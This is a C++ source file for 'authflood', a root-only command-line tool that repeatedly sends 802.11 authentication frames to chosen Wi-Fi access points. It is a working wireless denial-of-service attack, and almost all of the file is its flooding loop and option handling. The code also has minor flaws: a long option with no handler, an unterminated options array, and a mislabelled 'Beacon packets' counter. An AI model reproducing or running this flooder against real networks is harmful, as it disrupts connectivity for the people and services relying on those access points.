//
//  main.cpp
//  authflood
//
//  Created by BlueCocoa on 2017/5/19.
//  Copyright © 2017 BlueCocoa. All rights reserved.
//

#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/signal.h>
#include <unistd.h>
#include <atomic>
#include <condition_variable>
#include <iostream>
#include <vector>
#include <thread>
#include "WirelessKit.hpp"

using namespace std;
using namespace WirelessKit;

const struct option options[] = {
    { "ifname", optional_argument, NULL, 'i' },
    { "bssid",  optional_argument, NULL, 's' },
    { "help",   no_argument,       NULL, 'h' },
};

void quit(int);

atomic_bool working;
condition_variable cond;
vector<AuthFloodFrame> APs;

int main(int argc, const char * argv[]) {
    if (getuid()) {
        fprintf(stderr, "This tool requires root privileges\n");
        exit(EXIT_FAILURE);
    }
    
    Interface ifname("en0");
    
    int arg, argslot;
    while (argslot = -1, (arg = getopt_long(argc, (char * const *)argv, "b:i:hs:", options, &argslot)) != -1) {
        switch (arg) {
            case 'b' : {
                MAC aBSSID(optarg);
                if (aBSSID.is_valid()) APs.emplace_back(AuthFloodFrame(AP(aBSSID)));
                break;
            }
            case 'i' : {
                ifname = std::string(optarg);
                break;
            }
            case 'h' : {
                fprintf(stdout, "%s [-i|--ifname en0] [-b|--bssid BB:BB:BB:BB:BB:BB]\nUse at your own risk & don't be jerk!", argv[0]);
                break;
            }
        }
    }
    
    if (ifname.open() && APs.size() > 0) {
        uint64_t count = 0;
        working = true;
        signal(SIGINT, quit);
        
        fprintf(stdout, "\n");
        std::thread flooder{[&count, &ifname]{
            while (working) {
                for (AuthFloodFrame & auth : APs) {
                    auth.auth(ifname);
                    count++;
                }
                fprintf(stdout, "%llu Beacon packets sent\r", count);
                fflush(stdout);
                usleep(100000);
            }
        }};
        
        std::mutex mtx;
        std::thread ([&]{
            std::unique_lock<std::mutex> lock(mtx);
            cond.wait(lock);
            working = false;
            fprintf(stdout, "\r%llu authenticate packets sent in total!\n", count);
        }).join();
    }
    
    return 0;
}

void quit(int) {
    working = false;
    cond.notify_one();
}
